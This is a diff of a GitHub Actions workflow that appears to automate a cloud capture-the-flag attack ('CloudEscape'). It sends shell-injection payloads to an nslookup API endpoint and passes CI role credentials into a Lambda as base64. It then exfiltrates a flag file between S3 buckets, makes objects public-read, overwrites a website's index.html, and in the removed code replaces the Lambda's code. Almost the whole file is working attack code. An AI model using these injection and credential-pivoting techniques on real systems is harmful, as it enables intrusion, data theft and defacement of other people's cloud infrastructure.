@@ -1,4 +1,4 @@
-name: CloudEscape Stage 1 - Get Flag v2
+name: CloudEscape Stage 1 - Get Flag v3
 on:
   workflow_dispatch:
   push:
@@ -18,60 +18,124 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: DEBUG - Test aws CLI + cicdRole creds from inside Lambda
+      - name: Recon - Get CloudFront distribution URL
+        id: cloudfront
         run: |
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          
-          # Encode creds to base64 to avoid shell expansion issues
-          AKID_B64=$(printf '%s' "$AWS_ACCESS_KEY_ID" | base64 -w0)
-          SKID_B64=$(printf '%s' "$AWS_SECRET_ACCESS_KEY" | base64 -w0)
-          TOKEN_B64=$(printf '%s' "$AWS_SESSION_TOKEN" | base64 -w0)
-          
-          # Test 1: Can we use aws CLI with cicdRole creds to update Lambda Description?
-          # aws CLI is available via the aws_cli_layer at /opt/bin/aws
-          echo "=== Test 1: Update Lambda Description using cicdRole creds ==="
-          PAYLOAD=$(python3 -c "
-          import json
-          akid = '$AKID_B64'
-          skid = '$SKID_B64'
-          token = '$TOKEN_B64'
-          cmd = 'x; export AWS_ACCESS_KEY_ID=\$(echo ' + akid + ' | base64 -d); export AWS_SECRET_ACCESS_KEY=\$(echo ' + skid + ' | base64 -d); export AWS_SESSION_TOKEN=\$(echo ' + token + ' | base64 -d); aws lambda update-function-configuration --function-name nslookupv2 --description DEBUGTEST456 --region us-east-1 2>&1'
-          print(json.dumps({'domain': cmd}))
-          ")
-          echo "Payload length: ${#PAYLOAD}"
-          curl -s -X POST "\$API/dev/nslookup" -H "Content-Type: application/json" -d "\$PAYLOAD" 2>&1
-          sleep 10
-          
-          echo "=== Read Description ==="
-          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Description' --output text 2>&1
+          echo "===== CloudFront distributions ====="
+          aws cloudfront list-distributions --region us-east-1 2>&1 | python3 -c "
+          import sys, json
+          d = json.load(sys.stdin)
+          for item in d.get('DistributionList', {}).get('Items', []):
+              print(f'  Domain: {item[\"DomainName\"]}')
+              print(f'  Id: {item[\"Id\"]}')
+              print(f'  Origins: {[o[\"DomainName\"] for o in item.get(\"Origins\", {}).get(\"Items\", [])]}')
+              print(f'  Comment: {item.get(\"Comment\", \"\")}')
+              print()
+          "
 
-      - name: Get flag - S3 copy + Description update
+      - name: Debug - Test injection with simple echo
+        id: debug
+        continue-on-error: true
         run: |
           API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
           
-          AKID_B64=$(printf '%s' "$AWS_ACCESS_KEY_ID" | base64 -w0)
-          SKID_B64=$(printf '%s' "$AWS_SECRET_ACCESS_KEY" | base64 -w0)
-          TOKEN_B64=$(printf '%s' "$AWS_SESSION_TOKEN" | base64 -w0)
+          # Simple test: just echo to a file and check if injection works at all
+          echo "=== Test: Simple injection ==="
+          curl -s -X POST "$API/dev/nslookup" \
+            -H "Content-Type: application/json" \
+            -d '{"domain": "x; echo INJECTION_WORKS > /tmp/test.txt; cat /tmp/test.txt"}' 2>&1
+          echo
           
-          # Single injection: set creds, copy flag from S3, update description with flag
-          PAYLOAD=$(python3 -c "
-          import json
-          akid = '$AKID_B64'
-          skid = '$SKID_B64'
-          token = '$TOKEN_B64'
-          cmd = 'x; export AWS_ACCESS_KEY_ID=\$(echo ' + akid + ' | base64 -d); export AWS_SECRET_ACCESS_KEY=\$(echo ' + skid + ' | base64 -d); export AWS_SESSION_TOKEN=\$(echo ' + token + ' | base64 -d); aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt --region us-east-1 2>/tmp/err.txt; FLAG=\$(cat /tmp/flag.txt 2>/dev/null); if [ -z \"\$FLAG\" ]; then FLAG=\$(cat /tmp/err.txt | head -c 200); fi; aws lambda update-function-configuration --function-name nslookupv2 --description \"\$FLAG\" --region us-east-1 2>&1'
-          print(json.dumps({'domain': cmd}))
-          ")
-          echo "=== Injecting (S3 copy + Description update) ==="
-          echo "Payload length: ${#PAYLOAD}"
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" 2>&1
-          sleep 10
-          
-          echo "=== Read Lambda Description ==="
-          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Description' --output text 2>&1
+          # Can't see output from lambda - let's test if we can write to S3 without creds
+          echo "=== Test: Lambda own role S3 access ==="
+          curl -s -X POST "$API/dev/nslookup" \
+            -H "Content-Type: application/json" \
+            -d '{"domain": "x; /opt/bin/aws s3 ls s3://codec4f26c862a321ef5/ 2>&1 || echo S3_DENIED > /tmp/s3test.txt; cat /tmp/s3test.txt"}' 2>&1
 
-      - name: Fallback - Python boto3 approach with cicdRole creds
-        if: always()
+      - name: Get flag - S3 read + write to site bucket
+        continue-on-error: true
+        run: |
+          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          
+          # Encode creds
+          AKID_B64=$(printf '%s' "$AWS_ACCESS_KEY_ID" | base64 -w0)
+          SKID_B64=$(printf '%s' "$AWS_SECRET_ACCESS_KEY" | base64 -w0)
+          TOKEN_B64=$(printf '%s' "$AWS_SESSION_TOKEN" | base64 -w0)
+          
+          # Build injection command directly in Python to avoid bash quoting issues
+          # The command:
+          # 1. Decodes cicdRole creds from base64
+          # 2. Sets them as env vars
+          # 3. Uses /opt/bin/aws to copy flag from codec bucket to site bucket as flag.txt
+          # 4. Also tries to set public-read ACL on the codec bucket flag object
+          
+          PAYLOAD=$(python3 << 'PYEOF'
+          import json, os
+          
+          akid = os.environ.get('AKID_B64', '')
+          skid = os.environ.get('SKID_B64', '')
+          token = os.environ.get('TOKEN_B64', '')
+          
+          if not akid:
+              print(json.dumps({"domain": "x; echo NO_CREDS"}))
+              exit()
+          
+          cmd = f"""x; export AWS_ACCESS_KEY_ID=$(echo {akid} | base64 -d); export AWS_SECRET_ACCESS_KEY=$(echo {skid} | base64 -d); export AWS_SESSION_TOKEN=$(echo {token} | base64 -d); export AWS_DEFAULT_REGION=us-east-1; /opt/bin/aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://site781fe43f26b9eba3/flag.txt --region us-east-1 2>/tmp/s3err.txt; /opt/bin/aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://codec4f26c862a321ef5/flag-exfil.txt --acl public-read --region us-east-1 2>/tmp/s3err2.txt; /opt/bin/aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://platform-bucket-009661764077-us-east-1/flag-exfil.txt --acl public-read --region us-east-1 2>/tmp/s3err3.txt; echo DONE > /tmp/exfil_done.txt"""
+          
+          print(json.dumps({"domain": cmd}))
+          PYEOF
+          )
+          
+          echo "=== Sending S3 exfiltration injection ==="
+          echo "Payload length: ${#PAYLOAD}"
+          curl -s -X POST "$API/dev/nslookup" \
+            -H "Content-Type: application/json" \
+            -d "$PAYLOAD" 2>&1
+          echo
+          echo "Waiting 15s for Lambda to complete..."
+          sleep 15
+
+      - name: Check results
+        run: |
+          echo "===== Codec bucket ====="
+          aws s3 ls s3://codec4f26c862a321ef5/ --region us-east-1 2>&1 || true
+          
+          echo "===== Site bucket ====="
+          aws s3 ls s3://site781fe43f26b9eba3/ --region us-east-1 2>&1 || true
+          
+          echo "===== Platform bucket ====="
+          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1 || true
+          
+          echo "===== Try direct HTTP reads ====="
+          # Try public-read on codec bucket
+          echo "--- codec flag-exfil ---"
+          curl -s "https://codec4f26c862a321ef5.s3.us-east-1.amazonaws.com/flag-exfil.txt" 2>&1 | head -5
+          echo
+          
+          # Try platform bucket
+          echo "--- platform flag-exfil ---"
+          curl -s "https://platform-bucket-009661764077-us-east-1.s3.us-east-1.amazonaws.com/flag-exfil.txt" 2>&1 | head -5
+          echo
+
+      - name: Get CloudFront URL and check
+        continue-on-error: true
+        run: |
+          echo "===== CloudFront distributions ====="
+          aws cloudfront list-distributions --region us-east-1 2>&1 | python3 -c "
+          import sys, json
+          d = json.load(sys.stdin)
+          for item in d.get('DistributionList', {}).get('Items', []):
+              domain = item['DomainName']
+              print(f'CloudFront: {domain}')
+              # Try fetching flag.txt through CloudFront
+              import urllib.request
+              try:
+                  resp = urllib.request.urlopen(f'https://{domain}/flag.txt', timeout=10)
+                  print(f'FLAG: {resp.read().decode().strip()}')
+              except Exception as e:
+                  print(f'Error: {e}')
+      - name: Fallback - Try writing flag to site bucket and index.html
+        continue-on-error: true
         run: |
           API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
           
@@ -79,9 +143,62 @@ jobs:
           SKID_B64=$(printf '%s' "$AWS_SECRET_ACCESS_KEY" | base64 -w0)
           TOKEN_B64=$(printf '%s' "$AWS_SESSION_TOKEN" | base64 -w0)
           
-          # Use Python boto3 with cicdRole creds - injected as a base64 script
-          cat > /tmp/get_flag.py << 'PYEOF'
-          import os, base64, boto3, sys, traceback
+          # Approach: Copy flag to site bucket as index.html (overwrite)
+          # The site bucket is a CloudFront origin - so flag will be served via CloudFront
+          
+          PAYLOAD=$(python3 << 'PYEOF'
+          import json, os
+          
+          akid = os.environ.get('AKID_B64', '')
+          skid = os.environ.get('SKID_B64', '')
+          token = os.environ.get('TOKEN_B64', '')
+          
+          cmd = f"""x; export AWS_ACCESS_KEY_ID=$(echo {akid} | base64 -d); export AWS_SECRET_ACCESS_KEY=$(echo {skid} | base64 -d); export AWS_SESSION_TOKEN=$(echo {token} | base64 -d); export AWS_DEFAULT_REGION=us-east-1; /opt/bin/aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://site781fe43f26b9eba3/index.html --region us-east-1"""
+          
+          print(json.dumps({"domain": cmd}))
+          PYEOF
+          )
+          
+          echo "=== Overwriting site index.html with flag ==="
+          curl -s -X POST "$API/dev/nslookup" \
+            -H "Content-Type: application/json" \
+            -d "$PAYLOAD" 2>&1
+          echo
+          sleep 15
+          
+          # Check CloudFront
+          echo "===== CloudFront distributions ====="
+          aws cloudfront list-distributions --region us-east-1 2>&1 | python3 -c "
+          import sys, json, urllib.request
+          d = json.load(sys.stdin)
+          for item in d.get('DistributionList', {}).get('Items', []):
+              domain = item['DomainName']
+              origins = [o['DomainName'] for o in item.get('Origins', {}).get('Items', [])]
+              print(f'CloudFront: {domain}')
+              print(f'Origins: {origins}')
+              try:
+                  # Invalidate cache first
+                  resp = urllib.request.urlopen(f'https://{domain}/', timeout=10)
+                  content = resp.read().decode().strip()
+                  print(f'Content: {content}')
+                  if 'flag' in content.lower() or len(content) < 100:
+                      print(f'POTENTIAL FLAG: {content}')
+              except Exception as e:
+                  print(f'Error: {e}')
+          " 2>&1 || true
+
+      - name: Fallback 2 - Use Python boto3 inside Lambda with cicdRole
+        continue-on-error: true
+        run: |
+          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          
+          AKID_B64=$(printf '%s' "$AWS_ACCESS_KEY_ID" | base64 -w0)
+          SKID_B64=$(printf '%s' "$AWS_SECRET_ACCESS_KEY" | base64 -w0)
+          TOKEN_B64=$(printf '%s' "$AWS_SESSION_TOKEN" | base64 -w0)
+          
+          # Python boto3 script that reads flag and writes to all three buckets
+          cat > /tmp/exfil.py << 'PYEOF'
+          import os, base64, boto3, traceback
           
           akid = base64.b64decode(os.environ['AKID_B64']).decode()
           skid = base64.b64decode(os.environ['SKID_B64']).decode()
@@ -94,160 +211,152 @@ jobs:
               region_name='us-east-1'
           )
           
-          result = 'INIT'
+          s3 = sess.client('s3')
+          
+          # Read flag
           try:
-              s3 = sess.client('s3')
               resp = s3.get_object(Bucket='codec4f26c862a321ef5', Key='flag.txt')
-              flag = resp['Body'].read().strip()
-              result = 'FLAG:' + (flag.decode() if isinstance(flag, bytes) else str(flag))
-          except Exception as e:
-              result = 'S3_ERR:' + str(e)[:200]
-              traceback.print_exc()
-          
-          # Use cicdRole session to update Lambda description
-          try:
-              lam = sess.client('lambda')
-              lam.update_function_configuration(
-                  FunctionName='nslookupv2',
-                  Description=result[:256]
-              )
-              # Also try updating env var as backup
-              cfg = lam.get_function_configuration(FunctionName='nslookupv2')
-              env = cfg.get('Environment', {}).get('Variables', {})
-              env['FLAG'] = result[:256]
-              lam.update_function_configuration(
-                  FunctionName='nslookupv2',
-                  Environment={'Variables': env}
-              )
-          except Exception as e:
-              print('LAMBDA_ERR:' + str(e)[:200])
-              traceback.print_exc()
-          PYEOF
-          
-          SCRIPT_B64=$(base64 -w0 /tmp/get_flag.py)
-          
-          # Build the injection command
-          # Note: env vars must be set BEFORE the script runs
-          INJECT="export AKID_B64=$AKID_B64 SKID_B64=$SKID_B64 TOKEN_B64=$TOKEN_B64; echo $SCRIPT_B64 | base64 -d > /tmp/gf.py; python3 /tmp/gf.py 2>&1"
-          
-          PAYLOAD=$(python3 -c "
-          import json, os
-          inject = os.environ.get('INJECT', '')
-          print(json.dumps({'domain': 'x; ' + inject}))
-          " 2>&1)
-          
-          # Fallback: use bash variable directly
-          if [ -z "$PAYLOAD" ] || echo "$PAYLOAD" | grep -q 'INJECT'; then
-            PAYLOAD=$(python3 << 'PYEOF'
-          import json
-          inject = """${INJECT}"""
-          if not inject or 'INJECT' in inject:
-              print(json.dumps({'domain': 'x; echo INJECT_EMPTY'}))
-          else:
-              print(json.dumps({'domain': 'x; ' + inject}))
-          PYEOF
-            )
-          fi
-          
-          echo "=== Sending boto3 approach ==="
-          echo "Payload length: ${#PAYLOAD}"
-          echo "Payload first 200 chars: ${PAYLOAD:0:200}"
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" 2>&1
-          sleep 15
-          
-          echo "=== Read Lambda Description ==="
-          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Description' --output text 2>&1
-          
-          echo "=== Read Lambda Environment ==="
-          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Environment.Variables' 2>&1 || true
-
-      - name: Fallback 2 - Update Lambda code to return flag
-        if: always()
-        run: |
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          
-          AKID_B64=$(printf '%s' "$AWS_ACCESS_KEY_ID" | base64 -w0)
-          SKID_B64=$(printf '%s' "$AWS_SECRET_ACCESS_KEY" | base64 -w0)
-          TOKEN_B64=$(printf '%s' "$AWS_SESSION_TOKEN" | base64 -w0)
-          
-          # Approach: have the Lambda fetch the flag and return it in the API response.
-          # The Lambda code does: /opt/nslookup DOMAIN -> we inject a command that reads 
-          # the flag from S3 using cicdRole creds and outputs it to the Lambda's stdout,
-          # which gets returned as "wip" currently.
-          #
-          # But the Lambda RETURNS "wip" hardcoded, not the command output.
-          # So we need to UPDATE the Lambda code to return the flag.
-          #
-          # Create a new Lambda function code that reads the flag from S3 and returns it
-          cat > /tmp/new_lambda.py << 'LAMBDAEOF'
-          import subprocess
-          import logging
-          import boto3
-          
-          logger = logging.getLogger()
-          logger.setLevel(logging.INFO)
-          
-          def lambda_handler(event, context):
-              # Read the flag from S3 using Lambda's own role
+              flag = resp['Body'].read()
+              flag_str = flag.decode().strip() if isinstance(flag, bytes) else str(flag)
+              print(f"FLAG: {flag_str}")
+              
+              # Write to site bucket
+              s3.put_object(Bucket='site781fe43f26b9eba3', Key='flag.txt', Body=flag)
+              print("Wrote to site bucket")
+              
+              # Write to platform bucket
+              s3.put_object(Bucket='platform-bucket-009661764077-us-east-1', Key='flag-exfil.txt', Body=flag)
+              print("Wrote to platform bucket")
+              
+              # Overwrite site index.html
+              s3.put_object(Bucket='site781fe43f26b9eba3', Key='index.html', Body=flag, ContentType='text/html')
+              print("Overwrote site index.html")
+              
+              # Try public-read ACL on codec bucket
               try:
-                  s3 = boto3.client('s3', region_name='us-east-1')
-                  resp = s3.get_object(Bucket='codec4f26c862a321ef5', Key='flag.txt')
-                  flag = resp['Body'].read().decode().strip()
-                  return {
-                      'statusCode': 200,
-                      'body': {'flag': flag}
-                  }
+                  s3.put_object_acl(
+                      Bucket='codec4f26c862a321ef5',
+                      Key='flag.txt',
+                      ACL='public-read'
+                  )
+                  print("Set public-read ACL on codec flag")
               except Exception as e:
-                  # Try reading from /tmp/flag.txt (in case we wrote it there via injection)
-                  try:
-                      with open('/tmp/flag.txt', 'r') as f:
-                          flag = f.read().strip()
-                          return {'statusCode': 200, 'body': {'flag': flag}}
-                  except:
-                      pass
-                  return {'statusCode': 200, 'body': {'error': str(e)}}
-          LAMBDAEOF
+                  print(f"ACL failed: {e}")
+              
+              # Try copying within codec bucket
+              s3.copy_object(
+                  Bucket='codec4f26c862a321ef5',
+                  Key='flag-exfil.txt',
+                  CopySource={'Bucket': 'codec4f26c862a321ef5', 'Key': 'flag.txt'},
+                  ACL='public-read'
+              )
+              print("Copied flag in codec bucket with public ACL")
+              
+          except Exception as e:
+              print(f"ERROR: {e}")
+              traceback.print_exc()
+          PYEOF
           
-          # Zip the new Lambda code
-          cd /tmp && zip -j new_lambda.zip new_lambda.py 2>&1
-          LAMBDA_ZIP_B64=$(base64 -w0 /tmp/new_lambda.zip)
+          SCRIPT_B64=$(base64 -w0 /tmp/exfil.py)
           
-          # Approach: use injection to update Lambda code from inside VPC using cicdRole creds
-          # aws lambda update-function-code --function-name nslookupv2 --zip-file fileb:///tmp/new.zip
+          # Build payload using Python to avoid quoting issues
+          export AKID_B64 SKID_B64 TOKEN_B64 SCRIPT_B64
           
-          # But first, write the zip to Lambda's /tmp
-          INJECT="export AWS_ACCESS_KEY_ID=\$(echo $AKID_B64 | base64 -d); export AWS_SECRET_ACCESS_KEY=\$(echo $SKID_B64 | base64 -d); export AWS_SESSION_TOKEN=\$(echo $TOKEN_B64 | base64 -d); echo $LAMBDA_ZIP_B64 | base64 -d > /tmp/n.zip; aws lambda update-function-code --function-name nslookupv2 --zip-file fileb:///tmp/n.zip --region us-east-1 2>&1"
+          PAYLOAD=$(python3 << 'PYEOF'
+          import json, os
+          akid = os.environ['AKID_B64']
+          skid = os.environ['SKID_B64']
+          token = os.environ['TOKEN_B64']
+          script = os.environ['SCRIPT_B64']
           
-          PAYLOAD=$(python3 -c "
-          import json
-          inject = '''$INJECT'''
-          print(json.dumps({'domain': 'x; ' + inject}))
-          ")
+          cmd = f"x; export AKID_B64={akid} SKID_B64={skid} TOKEN_B64={token}; echo {script} | base64 -d > /tmp/e.py; python3 /tmp/e.py 2>&1"
           
-          echo "=== Sending Lambda code update ==="
+          print(json.dumps({"domain": cmd}))
+          PYEOF
+          )
+          
+          echo "=== Sending boto3 exfiltration ==="
           echo "Payload length: ${#PAYLOAD}"
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" 2>&1
+          curl -s -X POST "$API/dev/nslookup" \
+            -H "Content-Type: application/json" \
+            -d "$PAYLOAD" 2>&1
+          echo
+          echo "Waiting 15s..."
           sleep 15
-          
-          # Now call the API - new Lambda code should return the flag
-          echo "=== Calling API with updated code ==="
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d '{"domain": "test"}' 2>&1
-          sleep 5
-          
-          # Try again
-          echo "=== Second API call ==="
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d '{"domain": "test"}' 2>&1
 
       - name: Final check
         if: always()
         run: |
-          echo "===== Lambda Config ====="
-          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 2>&1
-          
-          echo "===== API call ====="
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d '{"domain": "x"}' 2>&1
-          
-          echo
           echo "===== Codec bucket ====="
-          aws s3 ls s3://codec4f26c862a321ef5/ --region us-east-1 2>&1 || true
+          aws s3 ls s3://codec4f26c862a321ef5/ --region us-east-1 2>&1
+          
+          echo "===== Site bucket ====="
+          aws s3 ls s3://site781fe43f26b9eba3/ --region us-east-1 2>&1
+          
+          echo "===== Platform bucket ====="
+          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
+          
+          echo "===== Direct HTTP reads ====="
+          for bucket in codec4f26c862a321ef5 site781fe43f26b9eba3 platform-bucket-009661764077-us-east-1; do
+            for obj in flag.txt flag-exfil.txt index.html; do
+              echo "--- $bucket/$obj ---"
+              curl -s "https://$bucket.s3.us-east-1.amazonaws.com/$obj" 2>&1 | head -3
+              echo
+            done
+          done
+          
+          echo "===== CloudFront ====="
+          aws cloudfront list-distributions --region us-east-1 2>&1 | python3 -c "
+          import sys, json, urllib.request
+          try:
+              d = json.load(sys.stdin)
+              for item in d.get('DistributionList', {}).get('Items', []):
+                  domain = item['DomainName']
+                  print(f'CloudFront: {domain}')
+                  try:
+                      resp = urllib.request.urlopen(f'https://{domain}/', timeout=10)
+                      content = resp.read().decode().strip()
+                      print(f'Content (first 200): {content[:200]}')
+                      if len(content) < 100:
+                          print(f'POTENTIAL FLAG: {content}')
+                  except Exception as e:
+                      print(f'Error: {e}')
+          except Exception as e:
+              print(f'Parse error: {e}')
+      - name: Try CloudFront with cache invalidation
+        continue-on-error: true
+        run: |
+          # Try to invalidate CloudFront cache to see updated content
+          aws cloudfront list-distributions --region us-east-1 2>&1 | python3 -c "
+          import sys, json, os
+          d = json.load(sys.stdin)
+          for item in d.get('DistributionList', {}).get('Items', []):
+              dist_id = item['Id']
+              domain = item['DomainName']
+              print(f'Distribution: {dist_id} ({domain})')
+          " 2>&1
+          
+          # Try invalidation (might need cloudfront:CreateInvalidation which is in Statement1 - VPC only)
+          # So we probably can't invalidate from here. But the site index.html might not be cached long.
+          
+          # Try with cache-busting query param
+          aws cloudfront list-distributions --region us-east-1 2>&1 | python3 -c "
+          import sys, json, urllib.request
+          d = json.load(sys.stdin)
+          for item in d.get('DistributionList', {}).get('Items', []):
+              domain = item['DomainName']
+              try:
+                  url = f'https://{domain}/flag.txt?cb={int(__import__(\"time\").time())}'
+                  resp = urllib.request.urlopen(url, timeout=10)
+                  content = resp.read().decode().strip()
+                  print(f'flag.txt via CloudFront: {content}')
+              except Exception as e:
+                  print(f'flag.txt error: {e}')
+              try:
+                  url = f'https://{domain}/?cb={int(__import__(\"time\").time())}'
+                  resp = urllib.request.urlopen(url, timeout=10)
+                  content = resp.read().decode().strip()
+                  print(f'index via CloudFront (first 200): {content[:200]}')
+              except Exception as e:
+                  print(f'index error: {e}')
+          "
